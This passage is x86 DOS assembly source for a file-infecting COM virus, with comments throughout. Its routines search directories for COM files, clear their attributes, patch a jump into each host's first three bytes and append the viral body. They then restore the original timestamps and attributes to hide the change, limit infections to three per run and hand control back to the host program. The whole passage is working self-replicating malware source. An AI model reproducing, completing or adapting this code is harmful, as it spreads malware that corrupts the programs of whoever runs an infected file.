findfirstfile:
     mov                 ah,4Eh              ; AH=4Eh 'Find First File'
     lea                 dx,[bp+COMspec]     ; DX points to file specification
     mov                 cx,07h              ; Set CX to 7 for all attributes
     jmp                 short turn_point    ; Unconditional Jump

finished:
     mov                 byte ptr [bp+Back_Slash], '\' ; Put Back Slash in buffer
     mov                 ah,3Bh              ; AH=3Bh 'Change DIR'
     lea                 dx,[bp+Back_Slash]  ; DX points to Backslash
     int                 21h                 ; Call DOS

     mov                 ah,1Ah              ; AH=1Ah 'Set DTA'
     mov                 dx,80h              ; DX reset to 80h
     int                 21h                 ; Call DOS

     mov                 ah,09h              ; AH=09h 'Output String'
     lea                 dx,[bp+Thank_You]   ; DX points to Thank you message
     int                 21h                 ; Call DOS

     mov                 di,100h             ; Return Address
     push                di                  ; Push onto stack
     retn                                    ; Return to Host file

findnextdir:
     mov                 ah,3Bh              ; AH=3Bh 'Change DIR'
     lea                 dx,[bp+Back_Dir]    ; DX points to '..'
     int                 21h                 ; Call DOS
     jc                  finished            ; Jump if in root DIR
     jmp                 short findfirstfile ; Unconditional Jump

findnextfile:
     cmp                 byte ptr ds:[bp+Infection_Counter],03h     ; See if infect thrice yet
     je                  finished            ; Jump if equal
     mov                 ah,4Fh              ; AH=4Fh 'Find Next File'

turn_point:                                                              
     int                 21h                 ; Call DOS
     jc                  findnextdir         ; If not found change directories

infect:
     mov                 ax,word ptr [bp+DTA+1Ah]      ; Put filesize into AX
     push                ax ax ax
     sub                 ax,v_length         ; Subtract virus length from filesize
     or                  ax,ax               ; Compare with 00h
     jbe                 findnextfile        ; Jump if below or equal
     pop                 ax
     add                 ax,v_length         ; Add virus length to filesize
     cmp                 ax,-1               ; Compare new filesize with 65535
     jae                 findnextfile        ; Jump if above or equal

     mov                 ax,4301h            ; AH=43h 'Change File Mode'
     xor                 cx,cx               ; Clear CX.  0 is for a normal file
     lea                 dx,[bp+DTA+1Eh]     ; DX points to filename in 'DTA'
     int                 21h                 ; Call DOS

     mov                 ax,3D02h            ; AH=3Dh 'Open File'
     lea                 dx,[bp+DTA+1Eh]     ; DX points to filename in 'DTA'
     int                 21h                 ; Call DOS
; File handle is in AX
     xchg                bx,ax               ; Put handle in BX and function in AX
; AH=40h 'Read from File'
     mov                 ah,3Fh              ; Put 3Fh into BH
     lea                 dx,[bp+Host_File]   ; DX points to start of the Jump Instructions
     mov                 cx,03h              ; CX is the number of bytes to write
     int                 21h                 ; Call DOS

     pop                 ax
     sub                 ax,(v_length+03h)   ; Subtract virus length and 03h bytes from filesize
     cmp                 ax,word ptr [bp+Host_File+01h]     ; Compare to Jump location in Host
     je                  closefile           ; Jump if equal

     mov                 byte ptr [bp+Jump_To],0E9h    ; Move JUMP byte into first byte of Jump_To
     pop                 ax                  ; Pop filesize into AX
     sub                 ax,03h              ; Subtract 03h from filesize
     mov                 word ptr [bp+delta],ax        ; Put new delta offset into BP for writing
     mov                 word ptr [bp+Jump_To+01h],ax  ; Put Jump location into Jump_To + 01h

     mov                 ax,4200h            ; AH=42h 'Move File Pointer'
     sub                 cx,cx               ; Clear CX.  CX is offset.
     sub                 dx,dx
     int                 21h                 ; Call DOS

     mov                 ah,40h              ; AH=40h 'Write to File'
     lea                 dx,[bp+Jump_To]     ; DX points to start of the Jump Instructions
     mov                 cx,03h              ; CX is the number of bytes to write
     int                 21h                 ; Call DOS

     mov                 ax,4202h            ; AH=42h 'Move File Pointer'
     sub                 cx,cx               ; Clear CX.  CX is offset.
     sub                 dx,dx
     int                 21h                 ; Call DOS

     mov                 ah,40h              ; AH=40h 'Write to File'
     lea                 dx,[bp+v_start]     ; DX points to start of virus
     mov                 cx,v_length         ; CX is the number of bytes to write
     int                 21h                 ; Call DOS

     inc                 byte ptr [bp+Infection_Counter]    ; Increment infection counter

closefile:
     mov                 ax,5701h            ; AH=57h 'Time/Date Stamp'
     lea                 cx,[bp+DTA+16h]     ; CX points to location of Time 
     lea                 dx,[bp+DTA+18h]     ; DX points to location of Date
     int                 21h

     mov                 ah,3Eh              ; AH=3Eh 'Close File'
     int                 21h                 ; Call DOS

     mov                 ax,4301h            ; AH=43h 'Change File Mode'
     xor                 cx,cx               ; Clear CX
     lea                 dx,[bp+DTA+1Eh]     ; DX points to filename in 'DTA'
     mov                 cl,byte ptr [bp+DTA+15h] ; CL is the attribute
     int                 21h                 ; Call DOS

     jmp                 findnextfile        ; Unconditional Jump

